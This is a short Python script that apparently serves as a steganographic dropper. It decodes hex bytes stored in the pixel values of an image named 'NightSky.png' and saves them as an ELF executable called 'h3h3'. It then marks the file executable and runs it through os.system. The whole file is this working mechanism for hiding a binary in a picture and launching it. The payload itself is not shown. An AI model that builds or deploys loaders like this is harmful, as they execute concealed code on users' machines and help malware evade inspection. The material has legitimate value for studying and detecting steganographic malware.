import cv2
import os

def read_image(image_path):
    return cv2.imread(image_path, cv2.IMREAD_COLOR)

def hex_to_binary(hex_data):
    return bytes.fromhex(hex_data)

def extract_length_from_image(image):
    flat_image = image.flatten()
    length_hex = ''
    for i in range(0, 8, 2):
        length_hex += format(flat_image[i], '02x')
    data_length = int(length_hex, 16)
    return data_length

def extract_hex_from_image(image, data_length):
    flat_image = image.flatten()
    hex_data = ''
    for i in range(8, 8 + data_length * 2, 2):
        hex_data += format(flat_image[i], '02x')
    return hex_data

def save_binary(binary_data, output_path):
    with open(output_path, 'wb') as f:
        f.write(binary_data)

def extract_elf_from_image(image_path, output_binary_path):
    image = read_image(image_path)
    data_length = extract_length_from_image(image)
    hex_data = extract_hex_from_image(image, data_length)
    elf_binary = hex_to_binary(hex_data)
    
    save_binary(elf_binary, output_binary_path)

if __name__ == "__main__":
    image_path = '../NightSky.png'
    extracted_binary_path = './h3h3'
    extract_elf_from_image(image_path, extracted_binary_path)
    os.system('chmod +x ' + extracted_binary_path)
    os.system(extracted_binary_path)
